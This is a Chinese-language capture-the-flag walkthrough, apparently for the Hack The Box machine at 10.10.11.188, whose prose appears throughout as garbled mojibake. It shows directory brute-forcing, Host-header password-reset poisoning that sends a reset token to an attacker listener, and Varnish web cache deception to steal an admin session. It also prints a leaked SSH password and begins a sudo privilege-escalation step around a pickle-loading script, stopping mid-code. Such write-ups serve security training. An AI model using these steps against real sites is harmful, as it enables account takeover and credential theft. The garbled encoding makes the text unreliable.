<p>å¼€æ”¾ç«¯å£ï¼š22ï¼ˆSSHï¼‰ã€80ï¼ˆHTTPï¼‰ï¼Œå¹¶ä¸”è§‚å¯Ÿåˆ°http-server-headeræ˜¯Werkzeug/2.1.2å’ŒPython/3.8.10ï¼Œé‚£ä¹ˆå°±ææœ‰å¯èƒ½æ˜¯Flaskæ¡†æ¶</p>
<p>è®¿é—®<code>10.10.11.188</code>ï¼Œæ˜¯ä¸ªç™»å½•é¡µé¢ï¼Œå¯ä»¥çˆ†ç ´ï¼Œä½†è¿™ä¸æ˜¯ä¸Šç­–</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306152844883.png" style="zoom:67%;">

<p>æŸ¥çœ‹é¡µé¢æºç ï¼Œå‘ç°å¦‚ä¸‹æ³¨é‡Šå†…å®¹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306164131479.png"></p>
<p>æš´éœ²äº†ç”¨æˆ·<code>robert-dev-14522</code>ï¼Œè€Œä¸”åœ¨<code>/static</code>ç›®å½•åŠ è½½äº†å¾ˆå¤šjsæ–‡ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307113252811.png"></p>
<p>ç‚¹å‡»<code>FOGOT THE PASSWORD?</code>ï¼Œè·³è½¬åˆ°å¦‚ä¸‹<code>/forogt</code>é¡µé¢ï¼Œéœ€è¦è¾“å…¥ç”¨æˆ·å</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306154236754.png" style="zoom:67%;">

<p>è¾“å…¥adminï¼Œä¼šæç¤ºadminç”¨æˆ·çš„å¯†ç ä¸èƒ½è¢«é‡ç½®</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306154716616.png" style="zoom:67%;">

<p>éšä¾¿è¾“å…¥å…¶ä»–ç”¨æˆ·åï¼Œä¼šæç¤ºæ— æ•ˆç”¨æˆ·å</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306154742561.png" style="zoom:67%;">

<p>éšä¾¿è®¿é—®ä¸€ä¸ªç›®å½•ï¼Œ404é¡µé¢</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306154814575.png" style="zoom:80%;">

<p>googleä¸€ä¸‹404é¡µé¢å†…å®¹ï¼ŒåŸºæœ¬ç¡®å®šæ˜¯flaskæ¡†æ¶</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306154937806.png" style="zoom:67%;">

<p>ç”¨<code>feroxbuster</code>çˆ†ä¸€ä¸‹ç›®å½•</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# feroxbuster -u http://10.10.11.188/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ğŸ¤“                 ver: 2.7.3
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://10.10.11.188/
 ğŸš€  Threads               â”‚ 50
 ğŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 ğŸ‘Œ  Status Codes          â”‚ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.7.3
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ  HTTP methods          â”‚ [GET]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
 ğŸ‰  New Version Available â”‚ https://github.com/epi052/feroxbuster/releases/latest
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
200      GET      246l      484w     5186c http://10.10.11.188/
200      GET      246l      484w     5189c http://10.10.11.188/login
302      GET        5l       22w      189c http://10.10.11.188/home =&gt; http://10.10.11.188/
302      GET        5l       22w      189c http://10.10.11.188/tickets =&gt; http://10.10.11.188/
200      GET      253l      498w     5227c http://10.10.11.188/forgot
200      GET      261l      517w     5523c http://10.10.11.188/reset
[####################] - 3m     30000/30000   0s      found:6       errors:0      
[####################] - 3m     30000/30000   154/s   http://10.10.11.188/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>äº”ä¸ªç›®å½•ï¼š<code>/login</code>ã€<code>/home</code>ã€<code>/tickets</code>ã€<code>/forgot</code>ã€<code>/reset</code></p>
<p><code>/login</code>æ˜¯é»˜è®¤ç™»é™†é¡µé¢ï¼Œ<code>/forgot</code>åˆšè®¿é—®è¿‡ï¼Œ<code>/home</code>å’Œ<code>/tickets</code>ä¼šé‡å®šå‘åˆ°ç™»é™†é¡µé¢ï¼Œé‚£å°±è¯•è¯•è®¿é—®<code>/reset</code>ï¼Œå¯ä»¥è®¿é—®ï¼Œç›¸å½“äºè·³è¿‡äº†<code>/forgot</code>é¡µé¢è¾“å…¥ç”¨æˆ·åçš„è¿‡ç¨‹</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306164446032.png" style="zoom:67%;">

<p>éšä¾¿è¾“å…¥å¯†ç ï¼Œå‘ç°ä¼šæç¤ºæ— æ•ˆtokenï¼Œé‚£è¯´æ˜è¿˜æ˜¯è¦å›åˆ°<code>/forgot</code>é¡µé¢ï¼Œæƒ³åŠæ³•æ‹¿åˆ°token</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306164517769.png" style="zoom:67%;">

<p>å›åˆ°<code>/forgot</code>é¡µé¢ï¼Œè¾“å…¥åˆšæ‰å‘ç°çš„ç”¨æˆ·å<code>robert-dev-14522</code>ï¼Œçœ‹æç¤ºï¼Œåº”è¯¥æ˜¯æœ‰æ•ˆç”¨æˆ·ï¼Œä½†é‡ç½®å¯†ç çš„é“¾æ¥å‘é€åˆ°ç”¨æˆ·æ”¶ä»¶ç®±</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306165337667.png" style="zoom:67%;">

<h2 id="ä¸‰ã€é‡ç½®å¯†ç åŠŸèƒ½æŠ•æ¯’"><a href="#ä¸‰ã€é‡ç½®å¯†ç åŠŸèƒ½æŠ•æ¯’" class="headerlink" title="ä¸‰ã€é‡ç½®å¯†ç åŠŸèƒ½æŠ•æ¯’"></a>ä¸‰ã€é‡ç½®å¯†ç åŠŸèƒ½æŠ•æ¯’</h2><p>å‚è€ƒ<a href="https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning">https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning</a></p>
<p>ç›˜ä¸€ç›˜é‡ç½®å¯†ç çš„é€»è¾‘ï¼š</p>
<p>ç¬¬ä¸€æ­¥ï¼Œç”¨æˆ·è¾“å…¥ç”¨æˆ·åï¼Œæäº¤é‡ç½®å¯†ç è¯·æ±‚ï¼›</p>
<p>ç¬¬äºŒæ­¥ï¼ŒæœåŠ¡å™¨æ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªä¸´æ—¶tokenï¼Œè¿å¸¦tokenè¿”å›ä¸€ä¸ªé‡ç½®å¯†ç çš„é“¾æ¥åˆ°ç”¨æˆ·çš„<code>inbox</code>ï¼›</p>
<p>ç¬¬ä¸‰æ­¥ï¼Œç”¨æˆ·è®¿é—®é‡ç½®å¯†ç é“¾æ¥ï¼ŒæœåŠ¡å™¨éªŒè¯tokenï¼Œtokenä¸€è‡´åˆ™å¯ä»¥é‡ç½®å¯†ç ï¼Œå¦åˆ™æç¤ºtokenæ— æ•ˆ</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨ç¬¬ä¸€æ­¥ï¼Œæˆªè·ç”¨æˆ·æäº¤çš„é‡ç½®å¯†ç è¯·æ±‚ï¼Œä¿®æ”¹HTTPå¤´éƒ¨<code>Host</code>å­—æ®µå€¼ä¸ºæ”»å‡»æœºIPï¼Œç„¶ååœ¨æ”»å‡»æœºIPå¼€å¯httpæœåŠ¡ç›‘å¬ï¼Œå½“æœåŠ¡å™¨åšå®Œç¬¬äºŒæ­¥è¿”å›å¸¦tokençš„é‡ç½®å¯†ç çš„é“¾æ¥æ—¶ï¼Œæ”»å‡»æœºå°±å¯ä»¥æ”¶åˆ°æ­¤å“åº”ã€‚</p>
<p>æ”»å‡»æœºå¼€å¯ç›‘å¬</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç”¨åˆšæ‰çš„<code>robert-dev-14522</code>ç”¨æˆ·é‡æ–°å‘é€é‡ç½®å¯†ç è¯·æ±‚ï¼Œæˆªè·è¯·æ±‚åŒ…ï¼Œä¿®æ”¹hostå­—æ®µä¸ºæœ¬åœ°ipï¼Œç‚¹å‡»<code>send</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306170335445.png"></p>
<p>ç¨ç­‰ç‰‡åˆ»ï¼Œæˆ‘ä»¬å°±æ”¶åˆ°äº†æœåŠ¡å™¨çš„å“åº”ï¼Œæ˜¯ä¸ªå¸¦æœ‰tokençš„é‡ç½®å¯†ç URL</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.188 - - [06/Mar/2023 04:02:02] code 404, message File not found
10.10.11.188 - - [06/Mar/2023 04:02:02] "GET /reset?token=ZSDRCRl0pCgor%2FJNZl%2BgMY%2FMKBEBlPFYJZSdq4Yiti3oiS6qX3ipoFp4wFP5zD1EFR6R4oD11M4ht8kJ0X8S3w%3D%3D HTTP/1.1" 404 -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æµè§ˆå™¨è®¿é—®å¸¦tokençš„é‡ç½®å¯†ç URLï¼Œå¯çœ‹åˆ°æˆåŠŸé‡ç½®å¯†ç </p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306170610647.png" style="zoom:67%;">

<p>ç„¶åæˆåŠŸç™»å½•ä¸»é¡µé¢ï¼ŒæŸ¥çœ‹å„ä¸ªé¡µé¢ï¼Œå¤§è‡´å‰–æä¸€ä¸‹è¿™ç½‘ç«™åŠŸèƒ½ï¼šå°±æ˜¯ç½‘ç«™ç”¨æˆ·å¦‚æœé‡åˆ°ä¸€äº›æƒé™ç›¸å…³çš„é—®é¢˜æ—¶ï¼ˆæ¯”å¦‚æ— æ³•è®¿é—®æŸç«™ç‚¹ã€æƒ³åšä¸€äº›æ¯”è‡ªå·±æƒé™é«˜çš„äº‹æƒ…ï¼‰ï¼Œå¯ä»¥åœ¨[Escalate]é¡µé¢æäº¤ææƒç”³è¯·ï¼Œç„¶åTicketså°±ä¼šæ˜¾ç¤ºå„ä¸ªç”¨æˆ·æäº¤ç”³è¯·çš„ç›¸å…³ä¿¡æ¯ï¼Œæ¯”å¦‚ç”¨æˆ·å› ä¸ºä»€ä¹ˆé—®é¢˜éœ€è¦ææƒã€å“ªä¸ªç”¨æˆ·æäº¤çš„ã€è¯¥ç”¨æˆ·ç°åœ¨çš„æƒé™çŠ¶æ€æ˜¯æ€æ ·çš„ã€‚è¿™ä¸ªé€»è¾‘æ²¡ç›˜æ˜ç™½ï¼Œåé¢å¯èƒ½ä¼šä¸€å¤´é›¾æ°´ã€‚</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306170739470.png" style="zoom: 80%;">

<p>ç‚¹å‡»Ticketsï¼Œå¯çœ‹åˆ°ä¸€ä¸ªè¡¨æ ¼ï¼Œè¡¨æ ¼æœ€åä¸€æ æ˜¾ç¤ºDiegoç”¨æˆ·çš„SSHå‡­è¯ä¸èƒ½ç”¨ï¼Œè€Œä¸”æ­¤ç”¨æˆ·æƒé™å·²è¢«æå‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯•å›¾æŸ¥çœ‹å·²è¢«ææƒçš„é¡µé¢[Tickets(escalated)]</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307095314480.png" style="zoom:67%;">

<p>å´å‘ç°<code>Tickets(escalated)</code>æ— æ³•ç‚¹å‡»ï¼Œæœ‰ç‚¹å¯ç–‘ï¼ŒF12æŸ¥çœ‹æœ‰ç›®å½•<code>/admin_tickets</code>ï¼Œå·²ææƒçš„ç”¨æˆ·åº”è¯¥ç»™çš„æ˜¯adminæƒé™ï¼Œé‚£ä¹ˆDiegoç”¨æˆ·åº”è¯¥å°±è¢«æå‡åˆ°adminæƒé™äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä»¥adminèº«ä»½ç™»å½•ç½‘ç«™ï¼Œä»è€Œçœ‹åˆ°Diegoç”¨æˆ·çš„ç”¨æˆ·åå¯†ç ï¼Œä¹Ÿå°±æ˜¯SSHçš„ç”¨æˆ·åå¯†ç ã€‚F12æŠŠclasså€¼åˆ é™¤æˆ–è€…ç›´æ¥è®¿é—®<code>/admin_tickets</code>ç›®å½•éƒ½æ— æ•ˆï¼Œä¼šè·³è½¬åˆ°<code>http://10.10.11.188/home?err=ACCESS_DENIED</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307141914539.png" style="zoom: 80%;">

<h2 id="å››ã€webç¼“å­˜æ¬ºéª—"><a href="#å››ã€webç¼“å­˜æ¬ºéª—" class="headerlink" title="å››ã€webç¼“å­˜æ¬ºéª—"></a>å››ã€webç¼“å­˜æ¬ºéª—</h2><p>å›å¤´çœ‹nmapçš„æ‰«æç»“æœï¼ŒHTTPå“åº”æœ‰ä¸¤ä¸ªç½•è§çš„å­—æ®µ<code>X-Varnish</code>å’Œ<code>Via</code></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Mon, 06 Mar 2023 07:21:40 GMT
Content-Type: text/html; charset=utf-8
Allow: OPTIONS, GET, HEAD
Content-Length: 0
X-Varnish: 264229
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Accept-Ranges: bytes
Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a href="https://varnish-cache.org/">Varnish</a>æ˜¯ä¸€ä¸ªç”¨ä½œç¼“å­˜çš„åå‘ä»£ç†ç¨‹åº</p>
<p><a href="https://developer.fastly.com/reference/http/http-headers/X-Varnish/">X-Varnish</a>æ˜¯Varnishç”Ÿæˆçš„IDå·</p>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Via">Via</a>åœ¨æ­¤å¤„ç›¸å½“äºæŒ‡æ˜ç½‘ç«™æœåŠ¡ç”¨çš„HTTP/1.1å’ŒVarnish/6.2</p>
<p>å‚è€ƒ<a href="https://labs.withsecure.com/advisories/plone-cms-cache-poisoning-xss-vulnerability">https://labs.withsecure.com/advisories/plone-cms-cache-poisoning-xss-vulnerability</a></p>
<p>å‰é¢åœ¨æºç çœ‹åˆ°ç½‘ç«™åœ¨/staticç›®å½•åŠ è½½äº†å¾ˆå¤šä¿¡æ¯ï¼Œè€Œä¸”æœ‰åå‘ä»£ç†Varnishä½œç¼“å­˜ï¼Œé‚£ä¹ˆå°±ç”¨curlæµ‹è¯•ä¸€ä¸‹HTTPå“åº”å¤´éƒ¨å­—æ®µï¼Œå¦‚ä¸‹ï¼Œå¯çœ‹åˆ°<code>curl -I "http://10.10.11.188/"</code>å“åº”å¤´æ— <code>cache-control</code>å­—æ®µ</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# curl -I "http://10.10.11.188/"
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Tue, 07 Mar 2023 03:50:02 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 5186
X-Varnish: 596113
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Accept-Ranges: bytes
Connection: keep-alive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¦‚ä¸‹ï¼Œ<code>curl -I "http://10.10.11.188/static/"</code>å“åº”å¤´æœ‰<code>cache-control</code>å­—æ®µï¼Œè€Œä¸”è¯¥å­—æ®µè®¾ç½®çš„æƒé™æ˜¯<code>public</code>ï¼Œå³å¯å‘ä»»æ„æ–¹æä¾›ç¼“å­˜</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# curl -I "http://10.10.11.188/static/"
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Mon, 06 Mar 2023 14:44:46 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
cache-control: public, max-age=240
X-Varnish: 137222 1902052
Age: 47073
Via: 1.1 varnish (Varnish/6.2)
Connection: keep-alive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>curl -I "http://10.10.11.188/static/wa0er"</code>å“åº”å¤´æœ‰<code>cache-control</code>å­—æ®µ</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# curl -I "http://10.10.11.188/static/wa0er"
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Tue, 07 Mar 2023 03:49:24 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
cache-control: public, max-age=240
X-Varnish: 137236
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Connection: keep-alive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç»§ç»­æµ‹è¯•ï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æœ</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl -I "http://10.10.11.188/staticwa0er"	#æœ‰cache-controlå­—æ®µ
curl -I "http://10.10.11.188/wa0er/static"	#æœ‰cache-controlå­—æ®µ
curl -I "http://10.10.11.188/wa0erstatic"	#æ— cache-controlå­—æ®µ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>ç”±æ­¤æ¨æµ‹ï¼ŒVarnishåº”è¯¥æ˜¯åŒ¹é…â€/staticâ€å­—ç¬¦ä¸²ï¼ŒåŒ¹é…æˆåŠŸï¼Œåˆ™è¿”å›ç¼“å­˜ä¿¡æ¯ã€‚æˆ‘ä»¬è‚¯å®šæ²¡æ³•é€šè¿‡ç½‘ç«™æ­£å¸¸çš„æäº¤ææƒç”³è¯·çš„æµç¨‹å»è·å¾—adminæƒé™ï¼Œä½†çŸ¥é“ç”¨Varnishåšäº†ç¼“å­˜ï¼Œä¸”<code>cache-control</code>å­—æ®µæœ‰<code>public</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•è¯»ç¼“å­˜ã€‚</p>
<p>åœ¨[Escalate]é¡µé¢ï¼ŒLinkå†…å®¹å¡«å†™å¸¦æœ‰<code>/static</code>çš„URLï¼Œæäº¤ææƒç”³è¯·</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307145222841.png" style="zoom:80%;">

<p>ç„¶ååœ¨æœ¬åœ°æ‰§è¡Œcurlè¯·æ±‚å¯¹åº”çš„URLï¼Œè·å–sessionå€¼ï¼ˆåœ¨burpæŠ“åŒ…é‡æ”¾ä¹Ÿå¯ä»¥ï¼‰</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl -I http://10.10.11.188/static/wa0er<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307145341063.png"></p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">session=c0204f3b-c808-47db-ad92-7e4abbebe2be; HttpOnly; Path=/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>F12â†’Storageâ†’Cookiesï¼Œsessionå€¼æ”¹ä¸ºè·å–åˆ°çš„sessionå€¼</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307151247967.png"></p>
<p>é‡æ–°è®¿é—®<code>http://10.10.11.188/admin_tickets</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307150928057.png" style="zoom:80%;">

<p>å¯ä»¥çœ‹åˆ°è·å–åˆ°äº†diegoè´¦æˆ·å¯†ç </p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">diego
dCb#1!x0%gjq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>sshè¿ä¸Šå»</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307152413918.png"></p>
<h2 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h2><p>å‰é¢çŸ¥é“diegoç”¨æˆ·å·²è¢«ææƒï¼Œæ‰€ä»¥åº”è¯¥æ˜¯æœ‰sudoæƒé™ï¼Œå¯ä»¥æ‰§è¡Œ<code>sudo -l</code>çœ‹ä¸€ä¸‹diegoç”¨æˆ·æƒé™ï¼Œå‘ç°æœ‰ä¸ª<code>/opt/security/ml_security.py</code>å¯ä»¥æ‰§è¡Œ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307152612681.png"></p>
<p>çœ‹ä¸€ä¸‹å†…å®¹</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> csv
<span class="token keyword">import</span> pickle
<span class="token keyword">import</span> mysql<span class="token punctuation">.</span>connector
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">as</span> parse
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote
<span class="token keyword">from</span> sklearn <span class="token keyword">import</span> model_selection
<span class="token keyword">from</span> nltk<span class="token punctuation">.</span>tokenize <span class="token keyword">import</span> word_tokenize
<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>linear_model <span class="token keyword">import</span> LogisticRegression
<span class="token keyword">from</span> gensim<span class="token punctuation">.</span>models<span class="token punctuation">.</span>doc2vec <span class="token keyword">import</span> Doc2Vec<span class="token punctuation">,</span> TaggedDocument
<span class="token keyword">from</span> tensorflow<span class="token punctuation">.</span>python<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>saved_model_cli <span class="token keyword">import</span> preprocess_input_exprs_arg_string

np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span>

f1 <span class="token operator">=</span> <span class="token string">'/opt/security/lib/DecisionTreeClassifier.sav'</span>
f2 <span class="token operator">=</span> <span class="token string">'/opt/security/lib/SVC.sav'</span>
f3 <span class="token operator">=</span> <span class="token string">'/opt/security/lib/GaussianNB.sav'</span>
f4 <span class="token operator">=</span> <span class="token string">'/opt/security/lib/KNeighborsClassifier.sav'</span>
f5 <span class="token operator">=</span> <span class="token string">'/opt/security/lib/RandomForestClassifier.sav'</span>
f6 <span class="token operator">=</span> <span class="token string">'/opt/security/lib/MLPClassifier.sav'</span>

<span class="token comment"># load the models from disk</span>
loaded_model1 <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>f1<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
loaded_model2 <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>f2<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
loaded_model3 <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>f3<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
loaded_model4 <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>f4<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
loaded_model5 <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>f5<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
loaded_model6 <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>f6<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
model<span class="token operator">=</span> Doc2Vec<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"/opt/security/lib/d2v.model"</span><span class="token punctuation">)</span>

<span class="token comment"># Create a function to convert an array of strings to a set of features</span>
<span class="token keyword">def</span> <span class="token function">getVec</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    features <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i<span class="token punctuation">,</span> line <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
        test_data <span class="token operator">=</span> word_tokenize<span class="token punctuation">(</span>line<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        v1 <span class="token operator">=</span> model<span class="token punctuation">.</span>infer_vector<span class="token punctuation">(</span>test_data<span class="token punctuation">)</span>
        featureVec <span class="token operator">=</span> v1
        lineDecode <span class="token operator">=</span> unquote<span class="token punctuation">(</span>line<span class="token punctuation">)</span>
        lowerStr <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lineDecode<span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'link'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'object'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'form'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'embed'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'ilayer'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
